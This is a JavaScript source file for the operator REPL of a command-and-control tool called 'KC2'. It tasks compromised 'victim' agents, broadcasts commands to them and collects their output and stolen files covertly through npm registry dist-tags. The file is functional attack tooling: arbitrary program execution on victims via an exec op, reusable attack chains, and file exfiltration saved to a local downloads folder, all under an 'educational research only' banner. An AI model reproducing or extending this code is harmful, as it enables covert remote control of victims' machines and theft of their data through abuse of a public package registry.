// Attacker CLI: interactive REPL that issues commands and collects results
// exclusively through npm dist-tags. It never talks to a victim directly.
//
// While the prompt is idle, a background poller keeps running and prints
// live notifications: agents discovered (announce tags) and tasks completing
// or failing (result tags).
//
// Commands:
//   agents                      list historically discovered agents
//   task <agentId|all> <op> [args...]   task one known agent or broadcast to all
//                         (op allowlist: src/common/ops.js)
//   chain list|add|delete|run   named task sequences (chains.json)
//   history [n]                 show the last n requests/responses (default 20)
//   poll                        fetch results or show locally pending direct tasks
//   clean                       delete all lab tags (x-cmd-*/x-res-*/x-ann-*)
//   stats                       local counters: commands sent, results received
//   help                        show help
//   exit                        save state and quit

import readline from 'node:readline/promises';
import { clearScreenDown, cursorTo, moveCursor } from 'node:readline';
import fs from 'node:fs';
import path from 'node:path';
import { styleText } from 'node:util';
import { pathToFileURL } from 'node:url';
import { taskTtlMs, loadConfig, configArgFromArgv } from '../common/config.js';
import { createLogger } from '../common/logger.js';
import {
  PINNED_VERSION,
  MAX_TAG_LEN,
  decodeAnnounceTag,
  decodeCommandHeader,
  decodeResultTag,
  encodeCommandTags,
  isAnnounceTag,
  isCommandTag,
  isLabTag,
  isResultTag,
  reassembleResult,
} from '../common/protocol.js';
import { OP_DEFS, parseOpArgs } from '../common/ops.js';
import { RegistryClient } from '../common/registry.js';
import { saveState } from '../victim/agent.js';
import {
  assertKnownAgent,
  loadAttackerState,
  renameAgent,
  resolveAgentReference,
} from './state.js';
import {
  createSingleFlight,
  formatLiveNotification,
  formatResultBody,
  inputBlockGeometry,
  pendingDirectTasks,
  sanitizeRegistryText,
} from './text.js';

// Re-exported so existing imports from this module keep working.
export {
  createSingleFlight,
  formatLiveNotification,
  inputBlockGeometry,
  pendingDirectTasks,
  sanitizeRegistryText,
} from './text.js';
import {
  assertValidName,
  deleteChain,
  loadChains,
  migrateLegacyPlaybooks,
  parseChainFlags,
  saveChains,
  setChain,
  tokenize,
} from './chains.js';

const tty = process.stdout.isTTY;
const c = (color, s) => (tty ? styleText(color, s) : s);

// Readability palette (no emojis, no rainbow):
//   cyan bold    section headers        bold white   command/op names
//   yellow bold  featured commands      yellow       warnings / known agents
//   cyan         CLI title              dim          secondary text
//   green        success / joins        red          errors
//   magenta      agent ids / results    blue         prompt / outgoing
const section = (s) => c(['bold', 'cyan'], s);
const cmdName = (s) => c(['bold', 'white'], s);
const gold = (s) => c(['bold', 'yellow'], s);
const dim = (s) => c('dim', s);

const PROMPT_TEXT = 'kc2> '; // visible width matters for multi-row redraws

const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history

function ts() {
  return new Date().toTimeString().slice(0, 8);
}

function pushHistory(state, entry) {
  state.history.push(entry);
  if (state.history.length > HISTORY_MAX) {
    state.history.splice(0, state.history.length - HISTORY_MAX);
  }
}

// ---------------------------------------------------------------------------

function parseTaskLine(line) {
  const tokens = tokenize(line);
  const [, target, op, ...rest] = tokens;
  if (!target || !op) {
    throw new Error('usage: task <agentId|all> <op> [args...]');
  }
  return { target, op, args: parseOpArgs(op, rest) };
}

function sanitizeFilename(name) {
  return path.basename(String(name)).replace(/[^A-Za-z0-9._-]/g, '_') || 'file.bin';
}

/** Save a transferred file from a result payload to downloads/. */
function saveDownload(agentId, r, downloadDir = 'downloads') {
  const dir = path.resolve(downloadDir);
  fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
  if (!Number.isSafeInteger(r.seq) || r.seq < 1) {
    throw new Error('missing or invalid result sequence');
  }
  const out = path.join(dir, `${agentId}-seq${r.seq}-${sanitizeFilename(r.file.name)}`);
  if (path.dirname(out) !== dir) {
    throw new Error('resolved download path escapes downloads/');
  }
  if (!Number.isSafeInteger(r.file.size) || r.file.size < 0) {
    throw new Error('missing or invalid file size');
  }
  if (typeof r.file.dataB64 !== 'string' || !/^[A-Za-z0-9+/]*={0,2}$/.test(r.file.dataB64)) {
    throw new Error('file payload is not valid base64');
  }
  const data = Buffer.from(r.file.dataB64, 'base64');
  if (data.length !== r.file.size) {
    throw new Error(`decoded size mismatch (${data.length} bytes, expected ${r.file.size})`);
  }
  fs.writeFileSync(out, data, { mode: 0o600 });
  if (process.platform !== 'win32') fs.chmodSync(out, 0o600);
  return out;
}

function formatHistoryEntry(e) {
  const at = new Date(e.ts).toTimeString().slice(0, 8);
  if (e.dir === 'out') {
    const argStr = e.args && Object.keys(e.args).length > 0 ? ` ${JSON.stringify(e.args)}` : '';
    return `[${at}] ${c('blue', '->')} ${e.target} #${e.seq} ${e.op}${argStr}`;
  }
  const status = e.ok ? c('green', 'ok') : c('red', 'FAIL');
  const body = sanitizeRegistryText(e.ok ? e.output : e.error, HISTORY_OUTPUT_MAX);
  const op = sanitizeRegistryText(e.op ?? '?', 64);
  return `[${at}] ${c('magenta', '<-')} ${e.agentId} #${e.seq} ${op} ${status}:${formatResultBody(body)}`;
}

async function main() {
  const cfg = loadConfig(configArgFromArgv());
  const logger = createLogger({
    level: cfg.logLevel,
    logFile: cfg.logFile,
    console: false, // keep REPL output clean; log lines go to the file only
  });
  const statePath = path.resolve(cfg.stateFile || 'attacker-state.json');
  let state = loadAttackerState(statePath);
  const save = () => saveState(statePath, state);
  const ttlMs = taskTtlMs(cfg.pollIntervalSec);

  const client = new RegistryClient({
    registryUrl: cfg.registryUrl,
    packageName: cfg.packageName,
    token: cfg.token,
    timeoutMs: cfg.requestTimeoutMs,
    maxRetries: cfg.maxRetries,
    baseDelayMs: cfg.retryBaseDelayMs,
    logger,
  });

  console.log(c(['bold', 'cyan'], 'KC2 attacker CLI (educational research only)'));
  console.log(`${dim('registry:')} ${cfg.registryUrl}  ${dim('package:')} ${cfg.packageName}`);
  if (!cfg.token) {
    console.log(c('yellow', 'warning: NPM_C2_TOKEN is not set — writes will fail with 401'));
  }
  console.log(`${dim('state:')}    ${statePath} ${dim(`(history: ${state.history.length} entries)`)}`);
  console.log(`type ${cmdName('help')} for commands`);

  // --- REPL (created before the poller so notifications can redraw the prompt)

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: c('blue', PROMPT_TEXT),
  });
  let currentPromptText = PROMPT_TEXT;
  let attachedAgentId;

  function setPrompt(text) {
    currentPromptText = text;
    rl.setPrompt(c('blue', currentPromptText));
  }

  /** Print a live notification without mangling the line the user is typing. */
  function notify(line, redraw = true) {
    if (redraw && tty && !rlClosed) {
      // Erase the WHOLE input block, not just the cursor row: a long
      // command wraps onto several rows, and clearing only the cursor row
      // (the old behavior) left stray kc2> fragments inside the input.
      const { cursorRow } = inputBlockGeometry(rl.line.length, rl.cursor ?? rl.line.length, {
        promptWidth: currentPromptText.length,
        columns: process.stdout.columns,
      });
      cursorTo(process.stdout, 0);
      if (cursorRow > 0) moveCursor(process.stdout, 0, -cursorRow);
      clearScreenDown(process.stdout);
      console.log(line);
      rl.prompt(true);
      return;
    }
    console.log(formatLiveNotification(line, false));
    if (redraw && !rlClosed) rl.prompt(true);
  }

  // --- shared helpers -------------------------------------------------------

  function noteAgent(agentId, redraw = true) {
    if (state.agents.includes(agentId)) return;
    state.agents.push(agentId);
    notify(`[${ts()}] ${c('green', '[+] agent discovered:')} ${c('bold', agentId)}`, redraw);
  }

  function agentLabel(agentId) {
    const alias = state.agentAliases[agentId];
    return alias ? `${alias} (${agentId})` : agentId;
  }

  function printResult(agentId, r, redraw = true) {
    const op = sanitizeRegistryText(r.op ?? '?', 64);
    const output = sanitizeRegistryText(r.output);
    const error = sanitizeRegistryText(r.error);
    const head = `[${ts()}] ${c('magenta', agentLabel(agentId))} #${r.seq} ${op}`;
    if (!r.ok) {
      notify(`${head} ${c('red', 'FAILED')}:${formatResultBody(error)}`, redraw);
      return;
    }
    if (r.file && typeof r.file.dataB64 === 'string') {
      try {
        const out = saveDownload(agentId, r, cfg.downloadDir);
        notify(`${head} ${c('green', 'done')}:${formatResultBody(output)} -> saved to ${c('bold', out)}`, redraw);
      } catch (err) {
        notify(`${head} ${c('red', 'error')}: received file but failed to save: ${err.message}`, redraw);
      }
      return;
    }
    notify(`${head} ${c('green', 'done')}:${formatResultBody(output)}`, redraw);
  }

  function recordResult(agentId, r) {
    pushHistory(state, {
      dir: 'in',
      ts: Date.now(),
      agentId,
      seq: r.seq,
      op: sanitizeRegistryText(r.op ?? '?', 64),
      ok: r.ok,
      output: sanitizeRegistryText(r.output, HISTORY_OUTPUT_MAX),
      error: sanitizeRegistryText(r.error, HISTORY_OUTPUT_MAX),
    });
  }

  let cleaning = false;
  // First time each incomplete result group was observed, so a result whose
  // chunks were lost in transit stops nagging once the task TTL has passed.
  const incompleteFirstSeen = new Map();

  function printPendingTasks() {
    const pending = pendingDirectTasks(state.history, {
      now: Date.now(),
      ttlMs,
    });
    for (const task of pending.slice(-5)) {
      const ageSec = Math.max(0, Math.floor((Date.now() - task.ts) / 1000));
      console.log(c('yellow', `pending: ${task.target} #${task.seq} ${task.op} (${ageSec}s)`));
    }
  }

  const refreshOnce = createSingleFlight(async ({ redraw = false } = {}) => {
    if (cleaning) throw new Error('registry cleanup is in progress');
    const tags = await client.getDistTags();
    if (cleaning) return { fresh: 0, incomplete: [] };
    const observedAt = Date.now();
    const groups = new Map(); // "<agentId>:<seq>" -> parts[]
    for (const name of Object.keys(tags)) {
      if (isCommandTag(name)) {
        try {
          const cmd = decodeCommandHeader(name);
          state.nextSeq[cmd.agentId] = Math.max(state.nextSeq[cmd.agentId] ?? 0, cmd.seq);
        } catch (err) {
          logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (isAnnounceTag(name)) {
        try {
          const ann = decodeAnnounceTag(name);
          noteAgent(ann.agentId, redraw);
        } catch (err) {
          logger.warn(`skipping malformed announce tag "${name}": ${err.message}`);
        }
        continue;
      }
      if (!isResultTag(name)) continue;
      let part;
      try {
        part = decodeResultTag(name);
      } catch (err) {
        logger.warn(`skipping malformed result tag "${name}": ${err.message}`);
        continue;
      }
      const key = `${part.agentId}:${part.seq}`;
      if (!groups.has(key)) groups.set(key, []);
      groups.get(key).push(part);
    }
    let fresh = 0;
    const incomplete = [];
    for (const [key, parts] of groups) {
      if (state.seenResults.includes(key)) continue;
      const total = parts[0].total;
      if (new Set(parts.map((p) => p.chunk)).size !== total) {
        const firstSeen = incompleteFirstSeen.get(key) ?? observedAt;
        incompleteFirstSeen.set(key, firstSeen);
        const have = new Set(parts.map((p) => p.chunk)).size;
        if (observedAt - firstSeen >= ttlMs) {
          incomplete.push(`${key}: result incomplete (${have}/${total} chunks) after the task TTL — giving up, result lost`);
          state.seenResults.push(key);
          incompleteFirstSeen.delete(key);
          continue;
        }
        incomplete.push(`${key}: waiting for chunks (${have}/${total})`);
        continue;
      }
      incompleteFirstSeen.delete(key);
      try {
        const result = reassembleResult(parts);
        const a = parts[0].agentId;
        noteAgent(a, redraw);
        printResult(a, result, redraw);
        recordResult(a, result);
        state.seenResults.push(key);
        state.received++;
        state.perAgent[a] = (state.perAgent[a] ?? 0) + 1;
        fresh++;
      } catch (err) {
        logger.warn(`failed to reassemble ${key}: ${err.message}`);
      }
    }
    for (const key of incompleteFirstSeen.keys()) {
      if (!groups.has(key)) incompleteFirstSeen.delete(key);
    }
    save();
    return { fresh, incomplete };
  });

  async function pollOnce({ quiet = false, redraw = false } = {}) {
    const { fresh, incomplete } = await refreshOnce({ redraw });
    if (!quiet) {
      for (const message of incomplete) notify(c('yellow', message), redraw);
      console.log(fresh === 0 ? 'no new results' : `${fresh} new result(s)`);
      if (fresh === 0) printPendingTasks();
    }
    return fresh;
  }

  async function sendTask(target, op, args) {
    const seq = Math.max(0, ...Object.values(state.nextSeq)) + 1;
    const sentAt = Date.now();
    const payload = { op, args, ts: sentAt };
    // Oversized payloads are split into <chunk>of<total> command tags;
    // victims buffer the parts and execute only once every chunk is visible.
    const tags = encodeCommandTags(target, seq, payload);
    for (const tag of tags) {
      await client.setDistTag(tag, PINNED_VERSION);
    }
    state.nextSeq[target] = seq;
    state.sent++;
    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag: tags[0], chunks: tags.length });
    save();
    const detail =
      tags.length === 1
        ? `tag ${tags[0].length}/${MAX_TAG_LEN} chars`
        : `${tags.length} chunk tags of <=${MAX_TAG_LEN} chars`;
    console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (${detail})`);
    console.log(c('dim', `  ${tags[0]}`));
    if (tags.length > 1) console.log(c('dim', `  … +${tags.length - 1} more chunk tag(s)`));
  }

  /** Dispatch an already validated task request through the normal safety checks. */
  async function dispatchTask({ target, op, args }) {
    try {
      await pollOnce({ quiet: true });
    } catch (err) {
      logger.warn(`agent discovery refresh failed before task: ${err.message}`);
    }

    if (target === 'all') {
      if (state.agents.length === 0) throw new Error('no known agents available; task not sent');
      await sendTask('all', op, args);
      return;
    }
    const agentId = resolveAgentReference(state, target);
    assertKnownAgent(state, agentId ?? target);
    await sendTask(agentId, op, args);
  }

  // --- help rendering -------------------------------------------------------

  /** Render "left  description" rows with aligned columns. */
  function table(rows, { indent = 2, pad = 4 } = {}) {
    const width = Math.max(...rows.map(([left]) => left.length));
    return rows
      .map(
        ([left, right, featured]) =>
          ' '.repeat(indent) + (featured ? gold(left) : cmdName(left)) + ' '.repeat(width - left.length + pad) + dim(right),
      )
      .join('\n');
  }

  const commands = {
    help() {
      const commandRows = [
        ['task <agentId|all> <op> [args]', 'task one known agent or broadcast to all'],
        ['attach <agentId>', 'attach the prompt to one known agent', true],
        ['detach', 'leave attached-agent mode', true],
        ['rename <agentId> <name>', 'assign a durable local display name', true],
        ['chain add -n <name> -d <description> -s "<op> [args]" ...', 'save a named, agent-agnostic task sequence', true],
        ['chain run <name> -a <agentId|all>', 'run a saved sequence against the given agent', true],
        ['chain list [name] | delete <name>', 'inspect or remove saved sequences', true],
        ['agents', 'list historically discovered agents'],
        ['history [n]', 'last n requests/responses (default 20)'],
        ['poll', 'fetch results or show locally pending direct tasks'],
        ['clean', 'delete all x-cmd-* / x-res-* / x-ann-* tags'],
        ['stats', 'local counters: sent, received, per-agent'],
        ['help', 'this help'],
        ['exit', 'save state and quit'],
      ];
      const opRows = OP_DEFS.filter((o) => o.group !== 'fun').map((o) => [o.usage, o.summary, o.name === 'exec']);
      const funRows = OP_DEFS.filter((o) => o.group === 'fun').map((o) => [o.usage, o.summary]);
      console.log(
        [
          '',
          section('  COMMANDS'),
          table(commandRows),
          '',
          section(`  TASK OPS (${opRows.length})   ${dim('task <agentId|all> <op> [args]')}`),
          table(opRows),
          '',
          section(`  FUN OPS (${funRows.length})`),
          table(funRows),
          '',
          dim('  path args are absolute or relative to the agent cwd (see pwd/cd).'),
          dim('  chain flags: -n/--name, -a/--agent|--agentId, -s/--step (repeatable; quote steps with spaces).'),
          dim('  agent discoveries and task results print as live notifications.'),
          dim('  attached mode is a routing shortcut; results still arrive asynchronously through the registry.'),
          dim('  KC2 task ops are convenient built-ins; exec can invoke any OS program with arguments when enableExec=true (no shell parsing).'),
          '',
        ].join('\n'),
      );
    },

    async agents() {
      try {
        await pollOnce({ quiet: true }); // best-effort refresh
      } catch (err) {
        console.log(c('yellow', `registry refresh failed: ${err.message}`));
      }
      if (state.agents.length === 0) {
        console.log(dim('no agents seen yet'));
      } else {
        for (const a of state.agents) {
          console.log(
            `  ${c(['bold', 'green'], agentLabel(a))}  ${c('yellow', 'known')}, ${dim(`${state.perAgent[a] ?? 0} results`)}`,
          );
        }
      }
    },

    async task(line) {
      await dispatchTask(parseTaskLine(line));
    },

    async attach(line) {
      const tokens = line.trim().split(/\s+/);
      if (tokens.length !== 2) throw new Error('usage: attach <agentId>');
      const agentId = tokens[1];
      if (agentId === 'all') throw new Error('attach requires one known agent ID; "all" is not allowed');
      try {
        await pollOnce({ quiet: true });
      } catch (err) {
        logger.warn(`agent discovery refresh failed before attach: ${err.message}`);
      }
      const resolvedAgentId = resolveAgentReference(state, agentId);
      assertKnownAgent(state, resolvedAgentId ?? agentId);
      attachedAgentId = resolvedAgentId;
      setPrompt(`${agentLabel(resolvedAgentId)}@kc2> `);
      console.log(`attached to ${agentLabel(resolvedAgentId)}; bare KC2 task operations now target it; results remain asynchronous`);
    },

    rename(line) {
      const tokens = line.trim().split(/\s+/);
      if (tokens.length !== 3) throw new Error('usage: rename <agentId> <name>');
      state = renameAgent(state, tokens[1], tokens[2]);
      save();
      const agentId = resolveAgentReference(state, tokens[2]);
      console.log(`renamed ${agentId} to ${tokens[2]} (local display name)`);
    },

    detach() {
      if (!attachedAgentId) {
        console.log('not attached; prompt is already kc2>');
        return;
      }
      attachedAgentId = undefined;
      setPrompt(PROMPT_TEXT);
      console.log('detached; restored kc2> prompt');
    },

    async poll() {
      await pollOnce();
    },

    history(line) {
      const argStr = line.trim().split(/\s+/)[1];
      const n = argStr ? Number(argStr) : 20;
      if (!Number.isSafeInteger(n) || n <= 0) {
        console.log('usage: history [n]');
        return;
      }
      const entries = state.history.slice(-n);
      if (entries.length === 0) {
        console.log(dim('history is empty'));
        return;
      }
      console.log(dim(`last ${entries.length} of ${state.history.length} entries:`));
      for (const e of entries) console.log(formatHistoryEntry(e));
    },

    async clean() {
      cleaning = true;
      try {
        const tags = await client.getDistTags();
        const lab = Object.keys(tags).filter(isLabTag);
        if (lab.length === 0) {
          console.log('nothing to clean');
          return;
        }
        let deleted = 0;
        for (const tag of lab) {
          try {
            await client.deleteDistTag(tag);
            deleted++;
          } catch (err) {
            console.log(c('yellow', `failed to delete ${tag}: ${err.message}`));
          }
        }
        const remaining = Object.keys(await client.getDistTags());
        console.log(`deleted ${deleted}/${lab.length} lab tags; remaining: ${remaining.join(', ') || '(none)'}`);
      } finally {
        cleaning = false;
        save();
      }
    },

    async chain(line) {
      const file = path.join(path.dirname(statePath), 'chains.json');
      const usage =
        'usage: chain list [name] | add -n <name> -d <description> -s "<op> [args]" ... | delete <name> | run <name> -a <agentId|all>';
      const tokens = tokenize(line);
      const sub = tokens[1] ?? 'list';
      const { flags, positional } = parseChainFlags(tokens.slice(2));
      // Name may come from -n/--name or the first positional argument.
      if (flags.name && positional[0] && flags.name !== positional[0]) {
        throw new Error(`conflicting chain names: -n "${flags.name}" vs "${positional[0]}"`);
      }
      const name = flags.name ?? positional[0];
      if (positional.length > 1) {
        throw new Error(`unexpected arguments: ${positional.slice(1).join(' ')}\n${usage}`);
      }

      const migrated = migrateLegacyPlaybooks(file);
      if (migrated) {
        console.log(dim(`migrated ${path.basename(migrated)} -> ${path.basename(file)} (legacy kept as ${path.basename(migrated)}.bak)`));
      }
      const map = loadChains(file);

      if (sub === 'list') {
        // `list <name>` shows one chain's steps; bare `list` the overview.
        if (name) {
          const entry = map[name];
          if (!entry) throw new Error(`unknown chain "${name}" — see: chain list`);
          console.log(dim(`# ${entry.description}`));
          console.log(section(`chain "${name}" (${entry.steps.length} steps):`));
          entry.steps.forEach((s, i) => console.log(`  ${dim(`${i + 1}.`)} ${s}`));
          return;
        }
        const names = Object.keys(map);
        if (names.length === 0) {
          console.log(dim('no chains — add one with: chain add -n <name> -d <description> -s "<op> [args]" -s "<op> [args]" ...'));
          console.log(dim(`(stored in ${file}, also editable by hand as JSON)`));
          return;
        }
        for (const n of names) {
          const entry = map[n];
          const gap = ' '.repeat(Math.max(1, 22 - n.length));
          console.log(`${cmdName(n)}${gap}${dim(`# ${entry.description} • ${entry.steps.length} step(s)`)}`);
        }
        return;
      }

      if (sub === 'add') {
        assertValidName(name);
        if (flags.agent) {
          throw new Error('chains are agent-agnostic — pass the target at run time: chain run <name> -a <agentId|all>');
        }
        const next = setChain(map, name, flags.description, flags.steps);
        saveChains(file, next);
        console.log(
          `${Object.hasOwn(map, name) ? 'replaced' : 'added'} chain ${cmdName(name)} ` +
            dim(`(${flags.steps.length} step(s), saved to ${file})`),
        );
        return;
      }

      if (sub === 'delete') {
        saveChains(file, deleteChain(map, name));
        console.log(`deleted chain ${cmdName(name)}`);
        return;
      }

      if (sub === 'run') {
        const entry = map[name ?? ''];
        if (!entry) throw new Error(`unknown chain "${name ?? ''}" — see: chain list`);
        if (!flags.agent) throw new Error(`chain run needs a target agent: chain run ${name} -a <agentId|all>`);
        console.log(dim(`# ${entry.description}`));
        console.log(section(`running chain "${name}" against ${flags.agent} (${entry.steps.length} steps)`));
        for (const [i, step] of entry.steps.entries()) {
          console.log(dim(`[${i + 1}/${entry.steps.length}] ${step}`));
          const [op, ...rawArgs] = tokenize(step);
          // Steps are validated on creation, then sent as structured requests
          // so quoted arguments keep their boundaries at run time.
          await dispatchTask({
            target: flags.agent,
            op,
            args: parseOpArgs(op, rawArgs),
          });
        }
        return;
      }

      console.log(usage);
    },

    stats() {
      console.log(`${dim('commands sent:')}    ${cmdName(String(state.sent))}`);
      console.log(`${dim('results received:')} ${cmdName(String(state.received))}`);
      console.log(`${dim('agents seen:')}      ${cmdName(String(state.agents.length))}`);
      for (const [a, n] of Object.entries(state.perAgent)) {
        console.log(`  ${c('magenta', a)}: ${n} results`);
      }
      console.log(`${dim('history entries:')}  ${state.history.length}`);
      console.log(`${dim('next seq:')}         ${JSON.stringify(state.nextSeq)}`);
    },
  };

  // --- background poller: live notifications while the prompt is idle -------

  const notifyIntervalSec = Math.min(cfg.pollIntervalSec, 5);
  let rlClosed = false;
  const timer = setInterval(async () => {
    if (rlClosed) return;
    try {
      await pollOnce({ quiet: true, redraw: true });
    } catch (err) {
      notify(c('yellow', `[${ts()}] background poll failed: ${err.message}`));
    }
  }, notifyIntervalSec * 1000);
  timer.unref?.();
  console.log(c('dim', `live notifications on (polling every ${notifyIntervalSec}s)`));

  // --- REPL loop ------------------------------------------------------------

  rl.prompt();

  async function handleLine(line) {
    const trimmed = line.trim();
    const cmd = trimmed.split(/\s+/)[0];
    try {
      if (trimmed === '') {
        // ignore
      } else if (cmd === 'exit' || cmd === 'quit') {
        save();
        rl.close();
        return;
      } else if (cmd === 'watch') {
        console.log('watch is gone — live notifications already poll in the background');
      } else if (cmd === 'playbook') {
        console.log('playbook is now "chain" — see help; an existing playbooks.json migrates on first chain use');
      } else if (commands[cmd]) {
        await commands[cmd](trimmed);
      } else if (attachedAgentId && OP_DEFS.some((op) => op.name === cmd)) {
        await commands.task(`task ${attachedAgentId} ${line}`);
      } else if (attachedAgentId) {
        console.log(`unknown command "${cmd}" — type a KC2 task operation or "detach"`);
      } else {
        console.log(`unknown command "${cmd}" — type "help"`);
      }
    } catch (err) {
      console.log(c('red', `error: ${err.message}`));
      logger.error(`command "${cmd}" failed: ${err.message}`);
    }
    if (!rlClosed) rl.prompt();
  }

  // Serialize command handling so piped input cannot race (e.g. "exit"
  // killing the process before an earlier async command finishes printing).
  let queue = Promise.resolve();
  rl.on('line', (line) => {
    queue = queue.then(() => handleLine(line));
  });

  rl.on('close', () => {
    // Mark closed synchronously: piped input can fire 'close' while queued
    // async commands are still running, and they must not prompt a dead rl.
    rlClosed = true;
    queue.then(() => {
      clearInterval(timer);
      save();
      logger.close();
      console.log('bye');
      process.exit(0);
    });
  });
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((err) => {
    console.error(`fatal: ${err.message}`);
    process.exit(1);
  });
}
